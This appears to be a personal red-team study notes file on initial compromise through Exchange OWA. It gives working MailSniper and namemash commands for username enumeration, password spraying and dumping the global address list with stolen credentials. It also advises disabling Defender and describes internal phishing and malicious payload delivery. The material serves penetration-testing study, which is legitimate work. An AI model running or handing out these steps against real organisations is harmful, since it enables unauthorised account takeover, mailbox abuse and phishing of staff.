# Initial Compromise Notes

**Password Spraying**
I have a love/hate relationship with password spraying. Anyways, tools like [MailSniper](https://github.com/dafthack/MailSniper) or [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) can help.

Import MailSniper, turn off defenders real-time protection for this.
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate NetBIOS name of target domain with Invoke-DomainHarvestOWA from MailSniper. I find you can also enumerate this with nmap-ing smb of devices on a domain. Although that's more from doing labs so probably more usefull for ctf's, don't recommend because port scanning is really loud.
```
Invoke-DomainHarvestOWA -ExchHostname <domain>
```

Not talked about yet, but check the websites for possible users or social media, add their names into an arbitrary file like names.txt for us to use a tool like namemash.py that turns this name into possible username permutations. 
```
./namemash.py names.txt > possible.txt
```

Now we can use Invoke-UsernameHarvestOWA to enumerate for possible users using this possible.txt and the NetBIOS we enumerated from before.
```
Invoke-UsernameHarvestOWA -ExchHostname <email subdomain> -Domain <domain> -UserList possible.txt -OutFile valid.txt
```

Now password spray, you can get easy to test passwords from places like [weakpasswords.net](https://weakpasswords.net/)
```
Invoke-PasswordSprayOWA -ExchHostname <email subdomain> -userList valid.txt -Password <password>
```

MailSniper has other functions like downloading the glabal address list
```
Get-GlobalAddressList -ExchHostname <mail subdomain> -UserName <domain\poppedUser -Password <password found> -OutFile gal.txt
```

**internal phishing**
With user creds you could just go to that email subdomain through a browser and logging in and sending phishing emails like that. 

**Initial Access Payloads**
You can attach a payload in the email or send a url where to download the malicious file. MOTW exists for any files downloaded via a browser which makes the file look untrusted. 
